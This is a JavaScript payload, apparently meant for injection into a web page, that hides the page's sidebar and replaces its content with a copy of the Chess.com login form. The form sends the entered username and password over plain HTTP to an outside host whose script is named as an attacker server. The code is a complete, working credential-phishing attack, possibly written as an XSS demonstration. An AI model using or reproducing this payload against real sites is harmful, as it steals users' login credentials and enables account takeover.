let phishingView = `
<style>
    .login-header {
        display: flex;
        justify-content: center;
        margin: 1.3rem auto;
        max-width: 100%;
        width: 33rem;
    }

    .login-logo {
        background: url(/bundles/web/images/logo/logo.d5e7118b.svg) no-repeat 50%;
        background-size: contain;
        display: inline-block;
        height: 3.2rem;
        text-indent: -999em;
        width: 11.6rem;
    }

    .login-component {
        margin: 0 auto 1.5rem;
        max-width: 100%;
        overflow: hidden;
        width: 33rem;
    }

    .login-form-wrapper {
        padding: 1.5rem 0.8rem;
    }

    @media (min-width: 330px) {
        .login-form-wrapper {
            padding: 1.5rem;
        }
    }

    @media (min-width: 768px) {
        .login-form-wrapper {
            padding: 3rem;
        }
    }

    .authentication-login-form {
        display: flex;
        flex-direction: column;
    }

    .login-form>*+* {
        margin-top: 1.5rem;
    }

    button {
        width: 100%;
    }
</style>
<header class="login-header">
    <a href="https://www.chess.com/" class="login-logo" title="Chess.com">
        Chess.com
    </a>
</header>
<main class="v5-section login-component">
    <div class="login-form-wrapper">
        <form novalidate="" method="post" action="http://chessdemo2.infinityfreeapp.com/a-t-t-a-c-k-e-r-s-e-r-v-e-r.php" autocomplete="on" id="login-form"
            class="authentication-login-form login-form">
            <div>
                <input type="email" id="username" name="_username" required="required" form-error-clear=""
                    class="ui_v5-input-component login-input" placeholder="Username or Email" autofocus=""
                    aria-label="Username or Email" autocomplete="email">
            </div>

            <div class="ui_v5-input-group-component">
                <input type="password" id="password" name="_password" required="required" form-error-clear=""
                    class="ui_v5-input-component ui_v5-input-group-space-right login-input" placeholder="Password"
                    aria-label="Password" autocomplete="current-password">

                <button type="button" id="toggle-password-visibility"
                    class="ui_v5-input-group-button login-toggle-password-visibility">
                    <span id="toggle-password-visibility-icon"
                        class="icon-font-chess ui_v5-input-group-icon login-icon-eye eye" aria-hidden="true">
                    </span>
                </button>
            </div>

            <div class="authentication-login-options">
                <a href="https://www.chess.com/forgot" class="authentication-login-forgot" title="Forgot Password?">
                    Forgot Password?
                </a>
                <label class="checkbox-inline"><input type="checkbox" id="_remember_me" name="_remember_me" class=""
                        container-class="checkbox-inline" data-tinymce="false" form-error-clear=""
                        full_name="_remember_me" value="1">
                    Remember
                </label>
            </div>

            <button type="submit" id="login" name="login" theme="primary" size="large"
                class=" ui_v5-button-component ui_v5-button-primary ui_v5-button-large" data-no-controls="true">Log
                In</button>
        </form>
    </div>
</main>
`;

let bodyEl = document.body;
let viewContainer = document.querySelector(".base-container");
let sideBarEl = document.querySelector(".base-sidebar");

bodyEl.classList.add("hacked");
sideBarEl.style.visibility = "collapse";
viewContainer.innerHTML = phishingView;
